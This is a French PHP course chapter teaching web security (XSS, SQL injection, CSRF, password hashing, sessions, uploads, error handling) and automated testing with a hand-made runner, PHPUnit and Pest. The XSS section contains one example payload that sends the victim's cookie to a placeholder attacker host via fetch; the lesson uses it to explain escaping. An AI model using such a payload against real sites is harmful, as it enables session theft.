---
title: Sécurité et tests
minutes: 150
level: intermediate
---

## Ce que tu vas apprendre

Une application qui fonctionne n'est pas une application finie. Dès qu'elle est en ligne, elle reçoit des visiteurs bien intentionnés et d'autres qui cherchent des failles. Et chaque modification risque de casser quelque chose qui marchait hier. Ce chapitre t'apprend à répondre à ces deux risques : **sécuriser** ton code PHP contre les attaques classiques, et l'**automatiser par des tests** pour pouvoir le modifier sans peur.

À la fin du chapitre, tu seras capable de :

- identifier les principales failles du web (XSS, injection SQL, CSRF, fixation de session) et t'en protéger ;
- hacher et vérifier un mot de passe avec `password_hash` et `password_verify` ;
- sécuriser les sessions et les cookies ;
- valider et assainir les entrées, et sécuriser un téléversement de fichier ;
- gérer les erreurs sans exposer d'informations sensibles ;
- écrire un petit moteur de tests en PHP pur et savoir ce qu'est un bon test ;
- reconnaître PHPUnit et Pest, et savoir quand les adopter ;
- tester une classe qui dépend d'une base de données.

Prérequis : les chapitres précédents, en particulier « HTTP, formulaires et APIs ». Prévois deux heures et demie.

## Penser comme un attaquant

Le principe fondateur de la sécurité web est simple : **toute donnée qui vient de l'extérieur est hostile jusqu'à preuve du contraire**. Cela inclut les champs de formulaire, les paramètres d'URL, les en-têtes, les cookies, les fichiers envoyés, et même les données d'une API tierce.

Deux règles guident ensuite chaque décision :

1. **valider à l'entrée** : refuser ce qui n'a pas le bon format ;
2. **échapper à la sortie** : adapter la donnée au contexte où elle est affichée (HTML, SQL, URL, shell).

Le référentiel de l'OWASP (Open Worldwide Application Security Project) publie une liste des risques les plus répandus. Voyons ceux que tu rencontreras le plus souvent en PHP.

## Faille XSS : le JavaScript injecté

Le **Cross-Site Scripting** survient quand tu affiches une donnée utilisateur sans l'échapper :

```php
<p>Bienvenue <?= $_GET['nom'] ?></p>
```

Si l'URL contient `?nom=<script>fetch('https://pirate.example/?c='+document.cookie)</script>`, le script s'exécute dans le navigateur de la victime et peut voler sa session. La parade est d'échapper systématiquement :

```php
function e(?string $valeur): string
{
    return htmlspecialchars($valeur ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
?>
<p>Bienvenue <?= e($_GET['nom'] ?? '') ?></p>
```

Cette petite fonction `e()` reproduit le comportement de `{{ }}` dans Blade, le moteur de templates de Laravel. En complément, tu peux envoyer l'en-tête `Content-Security-Policy` pour restreindre les scripts autorisés.

## Injection SQL

Tu l'as vue au chapitre précédent : une requête construite par concaténation laisse l'attaquant modifier le SQL. La seule parade fiable est la **requête préparée** :

```php
$stmt = $pdo->prepare('SELECT id, hash FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
```

Deux points d'attention : les paramètres liés ne fonctionnent que pour des **valeurs**, pas pour des noms de colonnes ou de tables. Si l'utilisateur choisit un tri, valide-le avec une liste blanche :

```php
$colonnesAutorisees = ['titre', 'minutes', 'id'];
$tri = in_array($_GET['tri'] ?? '', $colonnesAutorisees, true) ? $_GET['tri'] : 'id';

$sql = "SELECT * FROM roadmaps ORDER BY $tri"; // sûr car $tri vient de la liste blanche
```

:::quiz
Un utilisateur choisit la colonne de tri via `?tri=...`. Quelle est la protection correcte ?
- [ ] Utiliser une requête préparée avec un paramètre pour le nom de colonne
- [ ] Appliquer htmlspecialchars sur la valeur
- [x] Comparer la valeur à une liste blanche de colonnes autorisées
- [ ] Mettre la valeur en minuscules
> Les paramètres liés ne remplacent que des valeurs, pas des identifiants SQL. Pour un nom de colonne, on n'accepte que les valeurs d'une liste blanche prévue à l'avance.
:::

## Mots de passe : ne jamais les stocker en clair

Si ta base fuit, les mots de passe en clair exposent tes utilisateurs sur tous les services où ils les réutilisent. On stocke donc un **hachage** : une empreinte à sens unique, volontairement lente à calculer et salée automatiquement.

```php
// À l'inscription
$hash = password_hash($motDePasse, PASSWORD_DEFAULT);
// ex. "$2y$12$..." : à stocker dans une colonne VARCHAR(255)

// À la connexion
$stmt = $pdo->prepare('SELECT id, password_hash FROM users WHERE email = ?');
$stmt->execute([$email]);
$user = $stmt->fetch();

if ($user && password_verify($motDePasse, $user['password_hash'])) {
    session_regenerate_id(true);       // nouvelle session après connexion
    $_SESSION['user_id'] = $user['id'];

    if (password_needs_rehash($user['password_hash'], PASSWORD_DEFAULT)) {
        // recalculer et mettre à jour le hachage
    }
} else {
    $erreur = "Identifiants incorrects.";   // même message dans les deux cas
}
```

À retenir :

- **jamais** `md5()` ni `sha1()` pour des mots de passe : trop rapides, donc faciles à casser ;
- `PASSWORD_DEFAULT` choisit l'algorithme recommandé et évolue avec PHP ;
- le message d'erreur est identique que l'e-mail existe ou non, pour ne pas révéler quels comptes existent ;
- `session_regenerate_id(true)` après connexion empêche la **fixation de session**.

## Faille CSRF : la requête forgée

Le **Cross-Site Request Forgery** exploite le fait que le navigateur envoie automatiquement tes cookies. Une page piégée peut soumettre un formulaire vers ton site pendant que tu es connecté, et exécuter une action à ton insu (supprimer un compte, virer de l'argent).

La parade est un **jeton CSRF** : une valeur secrète, liée à la session, que le formulaire doit renvoyer.

```php
function jetonCsrf(): string
{
    $_SESSION['csrf'] ??= bin2hex(random_bytes(32));
    return $_SESSION['csrf'];
}

function verifierCsrf(?string $jeton): void
{
    if (!is_string($jeton) || !hash_equals($_SESSION['csrf'] ?? '', $jeton)) {
        http_response_code(419);
        exit('Jeton de sécurité invalide.');
    }
}
```

Dans le formulaire :

```php
<form method="post">
    <input type="hidden" name="_csrf" value="<?= e(jetonCsrf()) ?>">
    <!-- autres champs -->
</form>
```

Dans le traitement : `verifierCsrf($_POST['_csrf'] ?? null);`. Un site pirate ne connaît pas ce jeton et ne peut donc pas forger la requête. C'est le rôle de la directive `@csrf` dans Laravel. `hash_equals` compare en temps constant, ce qui évite certaines attaques par mesure de durée. Le cookie de session `SameSite=Lax` ajoute une seconde barrière.

## Sécuriser les sessions et les cookies

Dans le fichier de configuration ou au démarrage de la session :

```php
ini_set('session.use_strict_mode', '1');

session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'secure' => true,        // uniquement en HTTPS
    'httponly' => true,      // invisible pour le JavaScript
    'samesite' => 'Lax',
]);
session_start();
```

En production, le site doit être servi en **HTTPS** exclusivement. Le drapeau `secure` empêche d'envoyer le cookie sur une connexion non chiffrée.

## Téléversements de fichiers

L'upload est l'une des fonctionnalités les plus dangereuses. Ne te fie ni au nom ni au type annoncés par le client :

```php
function enregistrerAvatar(array $fichier): string
{
    if ($fichier['error'] !== UPLOAD_ERR_OK) {
        throw new RuntimeException("Échec du téléversement.");
    }
    if ($fichier['size'] > 2 * 1024 * 1024) {
        throw new RuntimeException("Fichier trop lourd (2 Mo maximum).");
    }

    $mime = (new finfo(FILEINFO_MIME_TYPE))->file($fichier['tmp_name']);
    $extensions = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/webp' => 'webp'];

    if (!isset($extensions[$mime])) {
        throw new RuntimeException("Format non autorisé.");
    }

    $nom = bin2hex(random_bytes(16)) . '.' . $extensions[$mime];
    move_uploaded_file($fichier['tmp_name'], __DIR__ . '/../storage/avatars/' . $nom);

    return $nom;
}
```

Les règles : limiter la taille, vérifier le **vrai** type MIME, générer **soi-même** le nom du fichier, et stocker hors du dossier `public/` quand c'est possible. Ne laisse jamais un utilisateur déposer un fichier `.php` dans un dossier exécutable.

## Gérer les erreurs sans rien révéler

Une page d'erreur qui affiche une trace PHP avec chemins et identifiants de base de données est un cadeau pour un attaquant. En production :

```ini
display_errors = Off
log_errors = On
error_log = /var/log/php/erreurs.log
```

Affiche à l'utilisateur un message neutre (« Une erreur est survenue ») et envoie le détail dans les logs. En développement, tu peux activer `display_errors` pour déboguer.

> **Attention** : n'affiche jamais `$e->getMessage()` d'une exception SQL à l'utilisateur. Il peut contenir des noms de tables ou des fragments de requête.

## Pourquoi tester ?

Un **test automatisé** est un petit programme qui vérifie qu'un autre programme se comporte comme prévu. Il t'apporte trois choses : la détection immédiate des régressions, une documentation exécutable du comportement attendu, et la confiance nécessaire pour refactorer.

Il existe trois niveaux :

| Niveau | Ce qu'il vérifie | Vitesse |
| --- | --- | --- |
| Unitaire | Une classe ou une fonction isolée | Très rapide |
| Intégration | Plusieurs composants ensemble (code + base) | Moyenne |
| Bout en bout | L'application complète via le navigateur | Lente |

On écrit beaucoup de tests unitaires, un peu d'intégration, et peu de tests de bout en bout.

## Un premier test en PHP pur

Testons une classe `Prix` sans aucun outil externe. Voici la classe, dans `src/Prix.php` :

```php
<?php

declare(strict_types=1);

namespace DevRoad;

final class Prix
{
    public function __construct(public readonly int $montant)
    {
        if ($montant < 0) {
            throw new \InvalidArgumentException("Le prix ne peut pas être négatif.");
        }
    }

    public function avecRemise(int $pourcent): self
    {
        if ($pourcent < 0 || $pourcent > 100) {
            throw new \InvalidArgumentException("Remise invalide.");
        }
        return new self((int) round($this->montant * (100 - $pourcent) / 100));
    }
}
```

Un mini-moteur de tests, `tests/run.php`, tient en quelques lignes :

```php
<?php

declare(strict_types=1);

require __DIR__ . '/../vendor/autoload.php';

use DevRoad\Prix;

$echecs = 0;

function test(string $nom, callable $fn): void
{
    global $echecs;
    try {
        $fn();
        echo "OK   $nom\n";
    } catch (Throwable $e) {
        $echecs++;
        echo "FAIL $nom : " . $e->getMessage() . "\n";
    }
}

function assertEgal(mixed $attendu, mixed $obtenu): void
{
    if ($attendu !== $obtenu) {
        throw new Exception("attendu " . var_export($attendu, true) . ", obtenu " . var_export($obtenu, true));
    }
}

test("une remise de 20 % réduit le prix", function () {
    assertEgal(8000, (new Prix(10000))->avecRemise(20)->montant);
});

test("une remise de 0 % ne change rien", function () {
    assertEgal(10000, (new Prix(10000))->avecRemise(0)->montant);
});

test("un prix négatif est refusé", function () {
    try {
        new Prix(-1);
    } catch (InvalidArgumentException) {
        return;
    }
    throw new Exception("une exception était attendue");
});

exit($echecs > 0 ? 1 : 0);
```

Lance `php tests/run.php`. Le code de sortie `1` en cas d'échec permet à un outil d'intégration continue de bloquer une livraison défectueuse. Ce petit exercice montre l'idée de base de tous les frameworks de test.

:::quiz
Que signifie le motif « Arrange, Act, Assert » dans un test ?
- [ ] Attendre, agir, afficher
- [x] Préparer les données, exécuter l'action testée, vérifier le résultat
- [ ] Analyser, ajouter, archiver
- [ ] Appeler, attendre, annuler
> Un bon test prépare un contexte (Arrange), exécute une seule action (Act), puis vérifie le résultat (Assert). Cette structure rend chaque test lisible et ciblé.
:::

## PHPUnit et Pest

En pratique, on utilise un framework. **PHPUnit** est la référence historique ; **Pest**, construit dessus, offre une syntaxe plus concise et c'est le choix par défaut des nouveaux projets Laravel.

```bash
composer require --dev phpunit/phpunit
vendor/bin/phpunit tests
```

```php
use PHPUnit\Framework\TestCase;
use DevRoad\Prix;

final class PrixTest extends TestCase
{
    public function test_remise_de_20_pourcent(): void
    {
        $this->assertSame(8000, (new Prix(10000))->avecRemise(20)->montant);
    }

    public function test_prix_negatif_refuse(): void
    {
        $this->expectException(InvalidArgumentException::class);
        new Prix(-1);
    }
}
```

Tu retrouves les mêmes idées : un nom explicite, une assertion, une exception attendue. Avec Pest, le même test s'écrit `test('remise de 20 %', fn() => expect((new Prix(10000))->avecRemise(20)->montant)->toBe(8000));`.

## Tester du code qui utilise une base

Pour tester une classe d'accès aux données, utilise une base **SQLite en mémoire** : rapide, vide à chaque test, aucun risque pour tes vraies données.

```php
final class DepotRoadmaps
{
    public function __construct(private PDO $pdo)
    {
    }

    public function ajouter(string $titre, int $minutes): int
    {
        $stmt = $this->pdo->prepare('INSERT INTO roadmaps (titre, minutes) VALUES (?, ?)');
        $stmt->execute([$titre, $minutes]);
        return (int) $this->pdo->lastInsertId();
    }

    public function tous(): array
    {
        return $this->pdo->query('SELECT * FROM roadmaps ORDER BY id')->fetchAll(PDO::FETCH_ASSOC);
    }
}

test("ajouter enregistre une roadmap", function () {
    $pdo = new PDO('sqlite::memory:', options: [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $pdo->exec('CREATE TABLE roadmaps (id INTEGER PRIMARY KEY AUTOINCREMENT, titre TEXT, minutes INTEGER)');

    $depot = new DepotRoadmaps($pdo);
    $depot->ajouter('Docker', 90);

    assertEgal(1, count($depot->tous()));
});
```

C'est ici que l'**injection de dépendances** du chapitre sur la POO prend tout son sens : parce que `DepotRoadmaps` reçoit son `PDO` en paramètre, on lui donne une base de test sans modifier une ligne.

## Atelier guidé : sécuriser et tester le gestionnaire de roadmaps

Compte une heure et demie. Reprends le projet `roadmaps-web` du chapitre précédent.

1. Crée une fonction `e()` et remplace tous les affichages de données par `e(...)`.
2. Crée `src/Securite.php` avec `jetonCsrf()` et `verifierCsrf()` ; ajoute le champ caché dans le formulaire et vérifie-le au traitement.
3. Ajoute une table `users` et un script d'inscription avec `password_hash`, puis un script de connexion avec `password_verify` et `session_regenerate_id(true)`.
4. Protège la page de création : sans `$_SESSION['user_id']`, redirige vers la connexion.
5. Passe la liste de tri en liste blanche pour le paramètre `?tri=`.
6. Extrais la logique de validation du formulaire dans une classe `ValidateurRoadmap` avec une méthode `valider(array $donnees): array` qui renvoie les erreurs.
7. Écris `tests/run.php` avec ton mini-moteur : au moins cinq tests sur `ValidateurRoadmap` (titre vide, titre trop long, durée non numérique, durée hors bornes, cas valide).
8. Ajoute un test d'intégration sur `DepotRoadmaps` avec une base SQLite en mémoire.
9. Ajoute un script Composer `"test": "php tests/run.php"` et lance `composer test`.
10. Casse volontairement une règle de validation et vérifie que le test correspondant échoue.

Pour t'auto-évaluer : pour chacune des failles XSS, injection SQL, CSRF et fixation de session, sais-tu nommer la protection que tu as mise en place dans ton projet ?

## Erreurs fréquentes

- **Se fier à la validation JavaScript** : elle se contourne en un clic, valide toujours côté serveur.
- **Utiliser `md5` ou stocker les mots de passe en clair.**
- **Échapper trop tôt** : stocke la donnée brute, échappe au moment de l'afficher.
- **Faire confiance à `$_FILES['x']['type']`** : il est fourni par le client.
- **Afficher les erreurs PHP en production.**
- **Tester l'implémentation plutôt que le comportement** : un test qui casse à chaque refactoring inutile devient un fardeau.
- **Écrire des tests qui dépendent les uns des autres** ou de la base de production.
- **Un message d'erreur de connexion trop précis** (« e-mail inconnu ») qui révèle les comptes existants.

## Bonnes pratiques

- Valide à l'entrée, échappe à la sortie, utilise des requêtes préparées, sans exception.
- Utilise `password_hash` / `password_verify` et régénère l'identifiant de session après connexion.
- Protège chaque formulaire qui modifie des données avec un jeton CSRF.
- Sers ton site en HTTPS et configure les cookies avec `httponly`, `secure` et `samesite`.
- Applique le principe du moindre privilège : un utilisateur de base de données avec seulement les droits nécessaires.
- Garde tes secrets dans `.env`, hors du dépôt, et lance `composer audit` régulièrement.
- Écris un test pour chaque bug corrigé, afin qu'il ne revienne jamais.
- Un test = un comportement, avec un nom qui dit ce qu'il vérifie.
- Rends tes tests rapides, indépendants et déterministes.

## À retenir

- Toute donnée externe est hostile : valide en entrée, échappe en sortie.
- `htmlspecialchars` contre le XSS, requêtes préparées contre l'injection SQL, jeton CSRF contre les requêtes forgées.
- Les mots de passe se hachent avec `password_hash` et se vérifient avec `password_verify`.
- Sessions et cookies se configurent avec `httponly`, `secure`, `samesite` et `session_regenerate_id`.
- En production, on journalise les erreurs au lieu de les afficher.
- Un test automatisé suit le motif Arrange, Act, Assert ; PHPUnit et Pest en sont les outils de référence.
- L'injection de dépendances et SQLite en mémoire rendent le code d'accès aux données testable.
